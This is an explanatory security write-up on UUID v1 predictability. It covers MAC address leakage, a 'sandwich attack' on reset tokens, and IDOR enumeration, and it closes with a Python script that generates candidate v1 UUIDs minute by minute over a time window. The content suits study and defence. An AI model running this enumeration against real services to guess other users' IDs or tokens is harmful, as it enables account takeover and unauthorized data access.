# UUID v1 Predictability

## Structure Breakdown
Timestamp (60 bits): Represents the count of 100-nanosecond intervals since October 15, 1582.

Clock Sequence (14 bits): A semi-random value initialized once to help avoid collisions if the system clock moves backward.

Node ID (48 bits): This is literally the MAC Address of the machine generating the UUID. (Not really true for modern systems)

The Result: A UUID that looks like this: **time_low-time_mid-time_hi_and_version-clock-node**

## The Flaws

**Predictability (The Sandwich Attack):** Because the UUID is based on time, if an attacker can generate a UUID on the server (e.g., by creating an account) at Time A, and another at Time B, they can mathematically calculate every possible UUID generated between those two times.

*Risk*: If UUID v1 is used for password reset tokens or session IDs, an attacker can trigger a reset for a victim, trigger one for themselves immediately after, and brute-force the small time window to take over the victim's account.

**Information Leakage:** The last 12 characters of a v1 UUID are the server's MAC address.

*Risk*: This allows an attacker to uniquely identify the physical hardware, track the server across different IP addresses, or use the MAC address OUI (Organizationally Unique Identifier) to determine the hardware manufacturer (e.g., recognizing it's a specific type of Dell server or a VMware instance).

## Attack Scenario (IDOR)

If a website uses UUID v1 for object references (e.g., /user/view/66b8b5e0-8e12-11ee-b9d1-0242ac120002):

- Decode: The attacker extracts the timestamp from their own UUID.

- Generate: The attacker generates past/future UUIDs by decrementing or incrementing the timestamp bits.

- Access: The attacker enumerates valid URLs to access other users' data without authorization.

## Example

Below is a script that loops through each minute of two dates and generates corresponding UUIDs (assuming clock sequence and node are known).

```python
import uuid
from datetime import datetime, timedelta, timezone

def create_manual_uuid1(dt: datetime, node_id: int, clock_seq: int = 0):
    # 1. UUID Epoch is Oct 15, 1582. 
    # The offset from Unix Epoch (Jan 1 1970) is 12219292800 seconds.
    # We convert to 100-nanosecond intervals (multiply by 10,000,000).
    UUID_EPOCH_OFFSET = 0x01b21dd213814000
    
    # Ensure datetime is timestamp (seconds)
    unix_timestamp = dt.replace(tzinfo=timezone.utc).timestamp()
    
    # Convert to 100ns intervals and add the UUID epoch offset
    uuid_time = int(unix_timestamp * 1e7) + UUID_EPOCH_OFFSET

    # 2. Split the 60-bit time into fields: time_low, time_mid, time_hi
    # time_low: Lower 32 bits
    time_low = uuid_time & 0xffffffff
    # time_mid: Next 16 bits
    time_mid = (uuid_time >> 32) & 0xffff
    # time_hi: Next 12 bits
    time_hi = (uuid_time >> 48) & 0x0fff
    
    # 3. Combine time_hi with the Version 1 identifier (0x1000)
    time_hi_version = time_hi | 0x1000

    # 4. Handle Clock Sequence (variant bits are added automatically by UUID class if using 'fields',
    # but strictly speaking, we prepare the integer values here)
    # We need the high 6 bits + variant 10xx (RFC 4122) -> 0x80
    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = ((clock_seq >> 8) & 0x3f) | 0x80

    # 5. Construct the UUID
    return uuid.UUID(fields=(
        time_low, 
        time_mid, 
        time_hi_version, 
        clock_seq_hi_variant, 
        clock_seq_low, 
        node_id
    ))

NODE = 0x026ccdf7d769
CL_SEQ = 11417

start_time = datetime(2025, 11, 20, 20, 0, 0)
end_time = datetime(2025, 11, 20, 23, 59, 0)
step = timedelta(minutes=1) #milliseconds=100

curr_time = start_time
while curr_time <= end_time:
    generated_uuid = create_manual_uuid1(curr_time, NODE, CL_SEQ)
    curr_time += step
    print(generated_uuid)

```